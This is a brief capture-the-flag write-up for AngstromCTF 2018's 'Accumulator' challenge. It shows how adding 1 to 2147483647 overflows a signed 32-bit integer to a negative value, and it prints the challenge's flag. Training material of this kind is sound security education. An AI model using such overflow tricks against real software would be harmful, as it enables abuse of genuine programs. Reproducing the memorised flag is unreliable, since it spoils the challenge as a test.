# AngstromCTF_2018: Accumulator

**Category:** Binary
**Points:** 50
**Description:**

>I found [this program](accumulator64) ([source](accumulator.c)) that lets me add positive numbers to a variable, but it won't give me a flag unless that variable is negative! Can you help me out? Navigate to /problems/accumulator/ on the shell server to try your exploit out!

## Write-up
This is a simple integer overflow challenge, with 32-bit integers.

    $ ./accumulator64
    The accumulator currently has a value of 0.
    Please enter a positive integer to add: 2147483647
    The accumulator currently has a value of 2147483647.
    Please enter a positive integer to add: 1
    The accumulator has a value of -2147483648. You win!
    actf{signed_ints_aint_safe}

Therefore, the flag is `actf{signed_ints_aint_safe}`.
